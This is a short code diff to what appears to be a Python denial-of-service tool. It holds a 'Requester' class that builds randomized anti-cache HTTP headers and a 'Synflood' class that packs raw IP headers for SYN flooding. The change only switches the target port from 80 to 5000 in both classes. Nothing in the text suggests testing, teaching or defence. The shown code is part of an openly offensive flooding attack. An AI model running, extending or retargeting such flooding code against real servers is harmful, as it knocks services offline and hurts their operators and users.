@@ -172,7 +172,7 @@ class Requester(Thread):
 			if self.ssl == True:
 				self.port = 443
 		else:
-			self.port = 80
+			self.port = 5000
 	def header(self):
 		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
 		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
@@ -272,7 +272,7 @@ class Synflood(Thread):
 		ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)
 
 		source = self.port
-		dest = 80
+		dest = 5000
 		seq = 0
 		ack_seq = 0
 		doff = 5
